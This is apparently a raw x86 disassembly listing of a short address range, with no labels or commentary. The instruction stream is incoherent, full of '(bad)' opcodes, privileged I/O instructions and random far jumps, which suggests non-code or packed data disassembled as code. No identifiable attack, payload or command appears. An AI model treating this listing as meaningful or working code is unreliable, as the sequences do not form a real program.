  408cfe:	fnstsw WORD PTR ds:[edx*1-0x1f49a670]
  408d06:	test   BYTE PTR [ebx-0x732f92e9],ch
  408d0c:	mov    ch,0xbb
  408d0e:	or     ah,BYTE PTR [edx+eax*2+0x3efe758e]
  408d15:	str    WORD PTR [edi+ecx*8-0x5d21ab9f]
  408d1d:	and    dh,BYTE PTR ds:0xd6c1023d
  408d23:	nop
  408d24:	push   edx
  408d25:	clc    
  408d26:	dec    edi
  408d27:	sti    
  408d28:	sbb    ah,BYTE PTR ds:[eax-0x2e]
  408d2c:	sub    eax,0x9cef8050
  408d31:	inc    BYTE PTR [edx-0x34]
  408d34:	scas   al,BYTE PTR es:[edi]
  408d35:	adc    DWORD PTR [esi],esi
  408d37:	sbb    dh,BYTE PTR [esi-0x299eff0f]
  408d3d:	test   al,0xce
  408d3f:	xchg   esi,eax
  408d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d41:	mov    ds:0xbd85a305,eax
  408d46:	sbb    BYTE PTR [edx+edi*4-0x2d717a0e],cl
  408d4d:	loopne 0x408da6
  408d4f:	mov    ds:0x8ee0099b,eax
  408d54:	rcl    BYTE PTR [ecx],cl
  408d56:	fmul   DWORD PTR [edx+0x4b5c51fd]
  408d5c:	rcl    BYTE PTR [ecx],cl
  408d5e:	test   DWORD PTR [ebx-0x33],esp
  408d61:	mov    al,ds:0xe624d8b
  408d66:	pop    ebp
  408d67:	pop    edi
  408d68:	rcl    BYTE PTR [ecx],cl
  408d6a:	test   DWORD PTR [edx+edx*4-0x20],edi
  408d6e:	push   esp
  408d6f:	popa   
  408d70:	loope  0x408dbd
  408d72:	arpl   dx,ax
  408d74:	mov    edx,0xd28e85d2
  408d79:	enter  0x6140,0xc2
  408d7d:	or     edx,ecx
  408d7f:	mov    ss,edx
  408d81:	adc    DWORD PTR [eax-0x4a],esp
  408d84:	jbe    0x408dd5
  408d86:	pop    esp
  408d87:	bound  edx,QWORD PTR [edi]
  408d89:	add    BYTE PTR [edx-0x5],al
  408d8c:	(bad)  
  408d8d:	mov    ?,WORD PTR ds:0x1929b2cc
  408d93:	div    dh
  408d95:	adc    DWORD PTR [ebp-0x31ee1872],eax
  408d9b:	mov    ss,edx
  408d9d:	loopne 0x408d22
  408d9f:	push   cs
  408da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408da1:	sbb    bl,al
  408da3:	nop
  408da4:	sub    eax,0xac67cf66
  408da9:	fmulp  st(2),st
  408dab:	add    DWORD PTR [ebp+0x5b],edx
  408dae:	sbb    ecx,DWORD PTR [ebp-0x44ab57e8]
  408db4:	mov    ds:0xb5482060,al
  408db9:	xchg   edi,eax
  408dba:	mov    edi,DWORD PTR [edi+edi*1-0x177ffce6]
  408dc1:	add    edi,DWORD PTR [ebx-0x3aa9022d]
  408dc7:	div    BYTE PTR [eax-0x2210b09c]
  408dcd:	push   esi
  408dce:	pop    esp
  408dcf:	mul    DWORD PTR [ecx-0x43a3b09c]
  408dd5:	push   eax
  408dd6:	mov    ds:0x2c9ce6a,eax
  408ddb:	push   0xffffffce
  408ddd:	add    eax,0x166cd5ea
  408de2:	test   DWORD PTR [ecx+0x55],eax
  408de5:	jb     0x408df2
  408de7:	shl    BYTE PTR [edx-0x25aeff0f],cl
  408ded:	cmp    al,BYTE PTR [ebp-0x199b5e22]
  408df3:	or     eax,0x6033d2ea
  408df8:	(bad)  [eax+0x7853a935]
  408dfe:	test   BYTE PTR [esi-0x2e],bh
  408e01:	adc    eax,ebx
  408e03:	xchg   esi,eax
  408e04:	or     BYTE PTR [esi-0x25fd7377],bl
  408e0a:	rcl    DWORD PTR [edi-0x710aee09],1
  408e10:	ror    BYTE PTR [eax],cl
  408e12:	scas   eax,DWORD PTR es:[edi]
  408e13:	adc    eax,0x8e5d29ef
  408e18:	rcl    BYTE PTR [ecx],cl
  408e1a:	test   DWORD PTR ds:0x818c3df6,ecx
  408e20:	adc    dl,BYTE PTR [ecx]
  408e22:	xor    BYTE PTR [eax],bl
  408e24:	sub    eax,0xd24ef56f
  408e29:	rcr    DWORD PTR [ebp-0x22],0xa6
  408e2d:	fs dec edi
  408e2f:	adc    eax,0xb60d61ef
  408e34:	test   al,0x11
  408e36:	test   DWORD PTR [ebx+0x4ef54355],edx
  408e3c:	rcl    BYTE PTR [esi-0x2ecb1ac2],cl
  408e42:	fisttp QWORD PTR [esi+0x3d8511e2]
  408e48:	xor    al,0x11
  408e4a:	fst    QWORD PTR [edi+edx*8+0x57]
  408e4e:	std    
  408e4f:	out    dx,eax
  408e50:	aas    
  408e51:	popa   
  408e52:	pop    esp
  408e53:	fsub   QWORD PTR [edi-0x10eab09c]
  408e59:	gs jns 0x408e7f
  408e5c:	xchg   edx,eax
  408e5d:	push   cs
  408e5e:	lds    ecx,FWORD PTR [esi+0x1b49e355]
  408e64:	pop    ss
  408e65:	jns    0x408df2
  408e67:	iret   
  408e68:	cmc    
  408e69:	inc    edi
  408e6a:	pop    ebx
  408e6b:	xor    dl,BYTE PTR [edi-0x6f]
  408e6e:	ins    DWORD PTR es:[edi],dx
  408e6f:	adc    DWORD PTR [edx],0x57ee4c11
  408e75:	mov    eax,ds:0x1112875d
  408e7a:	dec    esp
  408e7b:	and    eax,DWORD PTR [edi+0x188ec50e]
  408e81:	or     DWORD PTR [esi],ebp
  408e83:	jmp    0x13d3f329
  408e88:	mov    bl,0xe
  408e8a:	lds    ecx,FWORD PTR [esi-0x7357652f]
  408e90:	rcl    BYTE PTR [ecx],cl
  408e92:	dec    esp
  408e93:	and    ecx,DWORD PTR [edi+0x348ec50e]
  408e99:	rcr    ebp,1
  408e9b:	popf   
  408e9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e9e:	int3   
  408e9f:	out    dx,eax
  408ea0:	aas    
  408ea1:	popa   
  408ea2:	pop    esp
  408ea3:	sub    al,0xa7
  408ea5:	fs dec edi
  408ea7:	adc    eax,0xce836def
  408eac:	rcr    DWORD PTR [ebp+0x11d28c88],1
  408eb2:	add    dh,ah
  408eb4:	sbb    ah,cl
  408eb6:	pop    ebp
  408eb7:	imul   esp,DWORD PTR [eax+0x2dab4f64],0x7b
  408ebe:	cmc    
  408ebf:	dec    esi
  408ec0:	rcl    BYTE PTR [esi+eax*1],cl
  408ec3:	clc    
  408ec4:	rcl    DWORD PTR [ecx],cl
  408ec6:	test   DWORD PTR [esi],edi
  408ec8:	sbb    DWORD PTR [ecx],ecx
  408eca:	imul   dl
  408ecc:	mov    eax,ds:0xbb139364
  408ed1:	push   cs
  408ed2:	lds    ecx,FWORD PTR [esi-0x724f652f]
  408ed8:	rcl    BYTE PTR [ecx],cl
  408eda:	add    BYTE PTR [ecx-0x26],ah
  408edd:	test   al,0xce
  408edf:	loop   0x408f4c
  408ee1:	and    al,BYTE PTR [ebp-0x6d92d72]
  408ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee8:	cmp    al,0x13
  408eea:	pop    eax
  408eeb:	xor    dl,BYTE PTR [ebp-0x15]
  408eee:	std    
  408eef:	sbb    esp,DWORD PTR [edi]
  408ef1:	ins    DWORD PTR es:[edi],dx
  408ef2:	mov    ebp,DWORD PTR [edi-0x1a]
  408ef5:	adc    bh,dl
  408ef7:	stos   BYTE PTR es:[edi],al
  408ef8:	or     BYTE PTR [eax-0x69f77f39],ch
  408efe:	les    eax,FWORD PTR [eax-0x6cae2cab]
  408f04:	sbb    esp,DWORD PTR ds:0x8b1e8ee3
  408f0a:	(bad)
  408f0d:	ror    DWORD PTR [ecx+eiz*2-0x26],0x89
  408f12:	pushf  
  408f13:	jg     0x408ebd
  408f15:	add    DWORD PTR [ecx+eiz*2-0x5e],ecx
  408f19:	or     DWORD PTR [ebx+0x2c64a1e9],esp
  408f1f:	sbb    ah,BYTE PTR [edi]
  408f21:	sub    DWORD PTR [eax],eax
  408f23:	popa   
  408f24:	mov    esi,0x1093bfa8
  408f29:	and    eax,0x601e5500
  408f2e:	and    BYTE PTR [ebx],bl
  408f30:	pop    es
  408f31:	sub    DWORD PTR [eax+0x1414e64b],ecx
  408f37:	pop    ebx
  408f38:	test   al,0x14
  408f3a:	adc    al,0x63
  408f3c:	ficom  WORD PTR [edx-0x3035772f]
  408f42:	cmp    bl,BYTE PTR [edx]
  408f44:	daa    
  408f45:	sub    DWORD PTR [eax+0x3fa8d668],ecx
  408f4b:	xchg   ebp,eax
  408f4c:	push   ebp
  408f4d:	ror    DWORD PTR [ebp+0x5769ad56],1
  408f53:	mov    esi,0xf54569cd
  408f58:	lods   al,BYTE PTR ds:[esi]
  408f59:	and    BYTE PTR [ebp-0x1d],al
  408f5c:	jne    0x408f07
  408f5e:	aas    
  408f5f:	jge    0x408fb6
  408f61:	in     al,0xf9
  408f63:	sbb    edi,DWORD PTR [eax]
  408f65:	or     eax,0x10be6188
  408f6a:	into   
  408f6b:	xchg   esi,eax
  408f6c:	mov    ebp,0x2d4f32bd
  408f71:	pop    esp
  408f72:	pushf  
  408f73:	in     al,dx
  408f74:	xchg   esi,eax
  408f75:	fs shl edx,1
  408f78:	cmp    al,BYTE PTR [edx+0x640d7bef]
  408f7e:	rcr    esi,1
  408f80:	mov    edx,0xa1ef485d
  408f85:	test   al,0x0
  408f87:	adc    dl,dl
  408f89:	adc    DWORD PTR [ebp+0x70a835f3],eax
  408f8f:	push   cs
  408f90:	rcl    BYTE PTR [ecx],cl
  408f92:	test   DWORD PTR [ebx+0x63002907],edx
  408f98:	(bad)  
  408f99:	sub    BYTE PTR [edi+0x62],dl
  408f9c:	add    eax,0x1896d610
  408fa1:	or     ebp,ecx
  408fa3:	jmp    0x408f46
  408fa5:	fs or  esi,0x3f
  408fa9:	add    esi,DWORD PTR [edi]
  408fab:	jne    0x409004
  408fad:	mov    ds:0xeaa1af4a,eax
  408fb2:	push   ebp
  408fb3:	test   BYTE PTR [ebx+0x62],0x4f
  408fb7:	out    dx,eax
  408fb8:	aad    0x51
  408fba:	shl    BYTE PTR [edi+0x6b034e55],1
  408fc0:	ret    0x98a8
  408fc3:	fwait
  408fc4:	mov    eax,0xb91b8bea
  408fc9:	adc    dh,dl
  408fcb:	xchg   esi,eax
  408fcc:	lods   eax,DWORD PTR ds:[esi]
  408fcd:	loop   0x408fcc
  408fcf:	cmp    ebp,edx
  408fd1:	push   ecx
  408fd2:	ror    BYTE PTR [edi-0x70aa442f],1
  408fd8:	cmp    al,0x1a
  408fda:	mov    BYTE PTR [ecx-0x26],dl
  408fdd:	rol    ebp,1
  408fdf:	cmp    al,0x2
  408fe1:	ret    
  408fe2:	fucomp st(7)
  408fe4:	shl    ebp,0x42
  408fe7:	out    dx,eax
  408fe8:	aas    
  408fe9:	popa   
  408fea:	pop    esp
  408feb:	inc    esp
  408fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fed:	fs dec edi
  408fef:	inc    esp
  408ff0:	jne    0x408ffb
  408ff2:	test   al,0x13
  408ff4:	ins    DWORD PTR es:[edi],dx
  408ff5:	or     ah,BYTE PTR [eax+0x8]
  408ff8:	push   ebp
  408ff9:	retf   
  408ffa:	std    
  408ffb:	sbb    eax,DWORD PTR [edi]
  408ffd:	sub    DWORD PTR [eax+0x38c8e64b],ecx
  409003:	mov    eax,ds:0x9fe7c13e
  409008:	fs icebp 
  40900a:	test   DWORD PTR [esi+0x2b08e93c],0x8e851e4e
  409014:	shr    ch,cl
  409016:	mov    WORD PTR [ebx],ds
  409018:	aas    
  409019:	sub    DWORD PTR [eax-0x7ae18ddd],ecx
  40901f:	mov    ss,WORD PTR [ebp+0x24]
  409022:	mov    BYTE PTR [ecx-0x26],ch
  409025:	test   al,0x3f
  409027:	xchg   ecx,eax
  409028:	sub    eax,0xbbbdfc77
  40902d:	jo     0x408fd6
  40902f:	cmp    DWORD PTR [edi-0x4],esi
  409032:	push   ds
  409033:	jo     0x4090b0
  409035:	push   ds
  409036:	xchg   ebp,eax
  409037:	(bad)  
  409038:	fidivr DWORD PTR [edx]
  40903a:	dec    esp
  40903b:	lahf   
  40903c:	rcl    BYTE PTR [ecx],cl
  40903e:	mov    al,BYTE PTR [edx+0x1b5e73ea]
  409044:	out    dx,eax
  409045:	sub    DWORD PTR [eax-0x7ae18ded],ecx
  40904b:	mov    gs,WORD PTR [ebp-0x2d71de70]
  409051:	adc    DWORD PTR [eax+0x36b3cde],edx
  409057:	sbb    ebp,DWORD PTR [esi+0x1e]
  40905a:	test   DWORD PTR [esi+0x614c298d],ecx
  409060:	fimul  DWORD PTR [ecx]
  409062:	dec    eax
  409063:	jmp    0x409006
  409065:	fs loopne 0x409095
  409068:	loop   0x40907b
  40906a:	test   DWORD PTR [esi+0x1bf9de55],ecx
  409070:	adc    dl,BYTE PTR ds:0xa8ca5600
  409076:	ss xchg ebp,eax
  409078:	jmp    0x40903b
  40907a:	in     eax,dx
  40907b:	(bad)  
  40907c:	fld    TBYTE PTR [eax+0x191aa585]
  409082:	(bad)  
  409083:	loop   0x40903a
  409085:	xor    al,0x0
  409087:	pop    ebx
  409088:	cli    
  409089:	adc    BYTE PTR [esi],bh
  40908b:	xchg   ebp,eax
  40908c:	pop    ebx
  40908d:	(bad)  
  40908e:	jmp    0x445da7a8
  409093:	dec    esi
  409094:	repnz push ds
  409096:	test   DWORD PTR [esi+0x5354ffd2],ecx
  40909c:	fcom   DWORD PTR [ecx]
  40909e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40909f:	popa   
  4090a0:	test   eax,0xd27ec15c
  4090a5:	adc    DWORD PTR [ebp-0x5e259672],eax
  4090ab:	mov    dl,dl
  4090ad:	adc    DWORD PTR [ebp+0x4a56338e],eax
  4090b3:	xchg   edx,eax
  4090b4:	ror    BYTE PTR [ebx-0x7369897b],cl
  4090ba:	cmc    
  4090bb:	mov    cl,0xa1
  4090bd:	jmp    0xef4f:0x792ff655
  4090c4:	pop    ss
  4090c5:	cmp    DWORD PTR [ebx],esi
  4090c7:	std    
  4090c8:	jmp    0xda16:0xae8ce710
  4090cf:	out    dx,eax
  4090d0:	push   ebx
  4090d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d2:	dec    ebx
  4090d3:	std    
  4090d4:	rcl    ecx,cl
  4090d6:	dec    ebx
  4090d7:	sub    DWORD PTR [ebp+0x16],0x17da988a
  4090de:	in     al,dx
  4090df:	and    al,0x26
  4090e1:	push   ds
  4090e2:	adc    DWORD PTR [ebp-0x1ef2c169],edx
  4090e8:	push   ss
  4090e9:	xchg   ecx,eax
  4090ea:	add    DWORD PTR [edx+0x3a],0xfffffff6
  4090ee:	fsubr  DWORD PTR [esi+0x7fdb0522]
  4090f4:	or     DWORD PTR [ebp+eiz*8+0x79],edx
  4090f8:	shl    al,1
  4090fa:	jg     0x409174
  4090fc:	loopne 0x409082
  4090fe:	rcr    edi,1
  409100:	or     al,0xfa
  409102:	sub    al,0xf
  409104:	aas    
  409105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409106:	xchg   ebp,eax
  409107:	jne    0x4090b1
  409109:	fnstsw WORD PTR [edx+eax*2]
  40910c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40910d:	repnz test BYTE PTR [edi+0xe],bh
  409111:	cli    
  409112:	lahf   
  409113:	cdq    
  409114:	fsubr  QWORD PTR [ebx]
  409116:	mov    eax,ds:0xbcfbee06
  40911b:	mov    eax,ds
  40911d:	xchg   edi,eax
  40911e:	(bad)  
  40911f:	cmp    BYTE PTR [edx],ch
  409121:	inc    edx
  409122:	adc    al,0x92
  409124:	iret   
  409125:	and    cl,cl
  409127:	lock push ds
  409129:	xor    edi,ebp
  40912b:	mov    esp,0x6a07a4aa
  409130:	popf   
  409131:	(bad)  
  409133:	cmp    eax,0x16935912
  409138:	stc    
  409139:	dec    edi
  40913a:	fsub   st(3),st
  40913c:	fisubr DWORD PTR [ecx]
  40913e:	jae    0x40913b
  409140:	jmp    0x1cd7:0x6d65913c
  409147:	lahf   
  409148:	ret    0x7e53
  40914b:	je     0x4091a1
  40914d:	cs xchg ebp,eax
  40914f:	setns  BYTE PTR [edx]
  409152:	rcl    BYTE PTR [esi-0x505a8c20],cl
  409158:	inc    edx
  409159:	jnp    0x4091a0
  40915b:	cmp    al,0x3b
  40915d:	lock fst QWORD PTR [edx+0x32]
  409161:	mov    edi,DWORD PTR [ecx-0x425fd82]
  409167:	pop    edx
  409168:	rcr    DWORD PTR [esi],cl
  40916a:	xor    DWORD PTR [eax+0x10],0xffffffd2
  40916e:	cmp    al,0x45
  409170:	fidiv  WORD PTR [ecx+0x64]
  409173:	mov    ebx,gs
  409175:	push   ds
  409176:	sbb    BYTE PTR [esp+edx*8-0x3fa994fd],0x9d
  40917e:	xchg   DWORD PTR [esi],esi
  409180:	(bad)  
  409182:	push   cs
  409183:	fcom   st(5)
  409185:	add    edx,edi
  409187:	mov    dl,0xaf
  409189:	aas    
  40918a:	mov    ebp,0xff13de9a
  40918f:	inc    ecx
  409190:	xlat   BYTE PTR ds:[ebx]
  409191:	push   ebx
  409192:	jo     0x40912a
  409194:	mov    dl,0x21
  409196:	cmp    eax,0x825c1f99
  40919b:	call   0x7705b5a6
  4091a0:	push   ebx
  4091a1:	ror    DWORD PTR [ebp-0xad258a],0x9f
  4091a8:	push   edx
  4091a9:	repnz cmp DWORD PTR [ebp+0xb],ebp
  4091ad:	mov    es,WORD PTR [edx]
  4091af:	cwde   
  4091b0:	xchg   edx,eax
  4091b1:	sub    BYTE PTR [esi+0x2a34e141],al
  4091b7:	mov    ds:0x11edd1f2,eax
  4091bc:	in     al,0x1e
  4091be:	and    eax,0xd8fa3eb8
  4091c3:	data16 mov bl,0xe
  4091c6:	adc    eax,0xe78e0a9b
  4091cb:	inc    ebx
  4091cc:	scas   al,BYTE PTR es:[edi]
  4091cd:	mov    ecx,0x3ded7d35
  4091d2:	fwait
  4091d3:	inc    edx
  4091d4:	aam    0x7d
  4091d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091d7:	(bad)  
  4091d8:	aad    0x37
  4091da:	(bad)  [ebx-0x72]
  4091dd:	lock sub bl,BYTE PTR [ecx-0x32de39ce]
  4091e4:	sbb    al,0xe
  4091e6:	jecxz  0x40917a
  4091e8:	(bad)
  4091eb:	xchg   edx,eax
  4091ec:	pmaddwd mm3,mm4
  4091ef:	jae    0x40923c
  4091f1:	or     dh,cl
  4091f3:	and    cl,ah
  4091f5:	sub    DWORD PTR [ecx],ecx
  4091f7:	and    bh,dl
  4091f9:	test   ebp,0x231edf11
  4091ff:	cli    
  409200:	jne    0x4091d8
  409202:	aas    
  409203:	fxch   st(6)
  409205:	xor    al,0x53
  409207:	outs   dx,BYTE PTR ds:[esi]
  409208:	hlt    
  409209:	mov    bl,0xb3
  40920b:	(bad)  
  40920d:	mov    ds:0xc8dca23c,al
  409212:	nop
  409213:	test   eax,0xfc1611b1
  409218:	test   al,0xd6
  40921a:	xor    bl,ah
  40921c:	xchg   BYTE PTR [eax-0x6e167c71],ah
  409222:	(bad)  
  409223:	(bad)  
  409224:	push   ebp
  409225:	rcr    dl,1
  409227:	int3   
  409228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409229:	adc    DWORD PTR [esi+eax*1],edi
  40922c:	add    BYTE PTR [eax+esi*4+0x4e],al
  409230:	or     eax,0x65f385f2
  409235:	dec    edi
  409236:	mov    eax,ds:0x5a9db53
  40923b:	xchg   edi,eax
  40923c:	fldenv [edx-0x5c]
  40923f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409240:	jmp    0x8459:0xe95a8b81
  409247:	or     bl,BYTE PTR [ecx-0x47dc702c]
  40924d:	ins    DWORD PTR es:[edi],dx
  40924e:	in     eax,dx
  40924f:	xchg   edi,eax
  409250:	(bad)  
  409252:	pop    edx
  409253:	cmp    al,0x31
  409255:	inc    ecx
  409256:	addr16 jle 0x40929a
  409259:	outs   dx,BYTE PTR ds:[esi]
  40925a:	mov    esi,DWORD PTR [esp+eiz*8]
  40925d:	mov    dl,0x6
  40925f:	pop    ebx
  409260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409261:	mov    eax,ds:0x11f3f05c
  409266:	je     0x409232
  409268:	mov    bl,0x98
  40926a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40926b:	cmp    al,0xff
  40926d:	sbb    eax,0x3fbf4e85
  409272:	loope  0x40929d
  409274:	mov    cl,0xe2
  409276:	lea    edx,[ebx+0x6a51ac1f]
  40927c:	add    ebx,DWORD PTR [ecx]
  40927e:	jge    0x409201
  409280:	btr    DWORD PTR [ebp+0x7b30ce14],eax
  409287:	repnz inc ebp
  409289:	lock ror BYTE PTR [eax+0xe7770cb],1
  409290:	pop    ds
  409291:	and    DWORD PTR [eax],0x85e047dc
  409297:	jo     0x409261
  409299:	iret   
  40929a:	outs   dx,DWORD PTR ds:[esi]
  40929b:	adc    bl,BYTE PTR [edi-0x23]
  40929e:	add    cl,BYTE PTR [esi-0x5173d255]
  4092a4:	inc    esp
  4092a5:	in     al,dx
  4092a6:	cdq    
  4092a7:	adc    edx,0x60
  4092aa:	mov    bh,0xa1
  4092ac:	lock sbb eax,edi
  4092af:	lods   al,BYTE PTR ds:[esi]
  4092b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092b1:	adc    al,0x2d
  4092b3:	fistp  DWORD PTR [ebx-0x6fcbfbac]
  4092b9:	jne    0x40926c
  4092bb:	mov    ds:0xcdd1c5d2,al
  4092c0:	(bad)  
  4092c1:	and    al,BYTE PTR [ecx-0x45]
  4092c4:	jnp    0x4092e4
  4092c6:	frstor [edx]
  4092c8:	mov    edx,0x99d17d92
  4092cd:	xor    BYTE PTR [ebp+0x1dbce27a],al
  4092d3:	inc    ebp
  4092d4:	dec    ebp
  4092d5:	jge    0x409352
  4092d7:	lea    esi,[edi+0x55822ca1]
  4092dd:	leave  
  4092de:	scas   al,BYTE PTR es:[edi]
  4092df:	fimul  WORD PTR [ebx+0x2d585ec]
  4092e5:	mov    ebx,0xf09a8d7a
  4092ea:	and    eax,0xe0132e8e
  4092ef:	fsubr  QWORD PTR [edi-0x3e1d23cd]
  4092f5:	fwait
  4092f6:	pusha  
  4092f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f8:	adc    al,BYTE PTR [esi-0x3b]
  4092fb:	cmc    
  4092fc:	pop    edx
  4092fd:	jbe    0x4092b7
  4092ff:	mov    ?,WORD PTR [esi+0x5]
  409302:	add    eax,0x9c7c4a18
  409307:	adc    dl,dl
  409309:	inc    ebp
  40930a:	mov    DWORD PTR [eax+0x23],edx
  40930d:	push   edi
  40930e:	adc    dh,BYTE PTR [edi]
  409310:	xor    eax,0x53d41927
  409315:	xor    ebp,DWORD PTR [esi+ebx*4-0xdbec562]
  40931c:	mov    al,0x9b
  40931e:	test   eax,ebp
  409320:	mov    cl,0x2a
  409322:	sbb    al,0x83
  409324:	ror    DWORD PTR [ebx],cl
  409326:	mov    dl,BYTE PTR [ebx-0x33f0456e]
  40932c:	(bad)  
  40932d:	mov    cl,0x5
  40932f:	aam    0xf4
  409331:	push   ebp
  409332:	dec    eax
  409333:	test   al,0xd2
  409335:	in     al,dx
  409336:	ret    0x75c4
  409339:	rcl    DWORD PTR [ecx+edi*2-0x3cf0e19f],cl
  409340:	or     BYTE PTR [edx+0x66d36eb6],0x84
  409347:	adc    eax,0x75145193
  40934c:	dec    edi
  40934d:	shl    cl,cl
  40934f:	mov    es,WORD PTR [esp+ebx*8+0x6f1896ae]
  409356:	jmp    0xeefe:0xa9e0d290
  40935d:	jo     0x4093b9
  40935f:	fnsave [esi-0x6898ceef]
  409365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409366:	sbb    bh,BYTE PTR [esi-0x7f7afec7]
  40936c:	push   edi
  40936d:	inc    ecx
  40936e:	or     al,0xee
  409370:	inc    BYTE PTR [edx+0x53ee9fc0]
  409376:	arpl   WORD PTR [eax],di
  409378:	xchg   edx,eax
  409379:	jmp    0xc8db:0x5f0af36b
  409380:	lock xor al,0x7e
  409383:	retf   
  409384:	out    0x91,eax
  409386:	push   ds
  409387:	(bad)  
  409388:	dec    edx
  409389:	cwde   
  40938a:	xor    DWORD PTR [ecx-0x78],edx
  40938d:	add    al,0x59
  40938f:	bound  edx,QWORD PTR [ecx-0x22]
  409392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409393:	jbe    0x4093b0
  409395:	cwde   
  409396:	mov    ch,0x1b
  409398:	rcl    esp,cl
  40939a:	dec    ebp
  40939b:	and    BYTE PTR [edx],ch
  40939d:	and    cl,BYTE PTR [esp+eax*2-0x681b4e72]
  4093a4:	mov    edx,0xa8683a77
  4093a9:	fidivr WORD PTR [edx]
  4093ab:	popa   
  4093ac:	mov    WORD PTR [ecx+0x73],fs
  4093af:	leave  
  4093b0:	ror    DWORD PTR ds:0xb7bcf96e,cl
  4093b6:	cmp    al,0xe8
  4093b8:	push   edx
  4093b9:	sbb    BYTE PTR [eax+0x3e],0xe2
  4093bd:	inc    esi
  4093be:	pusha  
  4093bf:	fcmovnbe st,st(2)
  4093c1:	xor    al,0x59
  4093c3:	add    eax,0xc2d37fa1
  4093c8:	push   0x1e
  4093ca:	mov    BYTE PTR [esp+edx*4-0x19],cl
  4093ce:	mov    edx,0xff9a6d55
  4093d3:	xlat   BYTE PTR ds:[ebx]
  4093d4:	pop    esp
  4093d5:	push   ebx
  4093d6:	pop    es
  4093d7:	sub    eax,0x34e1c5cb
  4093dc:	call   0xcf11:0x7c6f1c6e
  4093e3:	adc    esp,DWORD PTR [eax+0x72490a0b]
  4093e9:	mov    esp,0xd9f6328b
  4093ee:	(bad)  
  4093ef:	popa   
  4093f0:	ror    DWORD PTR [edx-0x7c],0x47
  4093f4:	or     DWORD PTR [eax],ebx
  4093f6:	out    dx,eax
  4093f7:	pusha  
  4093f8:	jle    0x409418
  4093fa:	sub    al,0x6b
  4093fc:	pop    es
  4093fd:	mov    ch,0xaf
  4093ff:	mov    ch,0x66
  409401:	dec    ebp
  409402:	test   BYTE PTR [ebp+0x4e5e4feb],cl
  409408:	(bad)
  40940b:	cwde   
  40940c:	sahf   
  40940d:	addr16 cwde 
  40940f:	inc    eax
  409410:	xor    ch,BYTE PTR [edi+edi*8]
  409413:	xchg   esi,eax
  409414:	inc    eax
  409415:	cwde   
  409416:	test   DWORD PTR [esi-0x32],esp
  409419:	xchg   ecx,eax
  40941a:	mov    ecx,DWORD PTR [eax-0x71ffb070]
  409420:	fisttp WORD PTR [edx+0x33]
  409423:	cmp    edi,ecx
  409425:	add    edi,DWORD PTR [edi+edx*4-0x719c0416]
  40942c:	outs   dx,DWORD PTR ds:[esi]
  40942d:	xor    ch,BYTE PTR [esi]
  40942f:	xor    al,al
  409431:	cmp    al,0x38
  409433:	xchg   esi,eax
  409434:	pop    ecx
  409435:	loop   0x4093ec
  409437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409438:	and    DWORD PTR [ecx+0x5a],edx
  40943b:	repz jge 0x4093c9
  40943e:	arpl   WORD PTR [ebp-0x3b7b9e5c],bp
  409444:	push   ebp
  409445:	jae    0x4094ac
  409447:	outs   dx,BYTE PTR ds:[esi]
  409448:	mov    eax,ds:0xafa8af4f
  40944d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40944e:	in     al,dx
  40944f:	es daa 
  409451:	adc    ebx,ebp
  409453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409454:	(bad)  
  409455:	push   ss
  409456:	adc    eax,DWORD PTR [ecx]
  409458:	shr    DWORD PTR [edx+0x469214b8],0xb7
  40945f:	jns    0x409426
  409461:	fsub   DWORD PTR [ebx-0x72]
  409464:	sar    DWORD PTR [ebp-0x35],1
  409467:	das    
  409468:	iret   
  409469:	inc    ebp
  40946a:	fs std 
  40946c:	rcl    BYTE PTR [eax-0x44],cl
  40946f:	dec    esi
  409470:	adc    eax,DWORD PTR [eax+0x44]
  409473:	arpl   WORD PTR [esi],ax
  409475:	cdq    
  409476:	out    dx,eax
  409477:	mov    ?,WORD PTR [ebx-0x48]
  40947a:	and    ebp,edx
  40947c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40947d:	ds ja  0x409448
  409480:	mov    dl,0xec
  409482:	test   DWORD PTR [ebx],edx
  409484:	into   
  409485:	push   ss
  409486:	bound  edx,QWORD PTR [ecx-0xb]
  409489:	mov    edi,0xb94a8e18
  40948e:	outs   dx,BYTE PTR ds:[esi]
  40948f:	mov    bh,0x59
  409491:	push   ebx
  409492:	fbld   TBYTE PTR [esi]
  409494:	shl    BYTE PTR [eax-0x25],cl
  409497:	icebp  
  409498:	mov    ebx,0xb83cd5df
  40949d:	adc    ecx,esp
  40949f:	lds    edi,FWORD PTR [esi]
  4094a1:	and    ecx,DWORD PTR [eax-0x47]
  4094a4:	xor    dl,bh
  4094a6:	add    ebp,DWORD PTR [di+0x4862]
  4094ab:	and    eax,0xed110b66
  4094b0:	inc    eax
  4094b1:	inc    edi
  4094b2:	les    esi,FWORD PTR ds:0x8e958b14
  4094b8:	cmp    al,0xd5
  4094ba:	cmp    eax,0xe89b7f1c
  4094bf:	int    0xd3
  4094c1:	xor    eax,0x1435fd4b
  4094c6:	out    0x2d,al
  4094c8:	call   0xd4e4:0x12e129dd
  4094cf:	mov    fs,ebp
  4094d1:	pushf  
  4094d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094d3:	enter  0x506a,0x1e
  4094d7:	xchg   BYTE PTR [ecx-0x4f3d264f],ch
  4094dd:	clc    
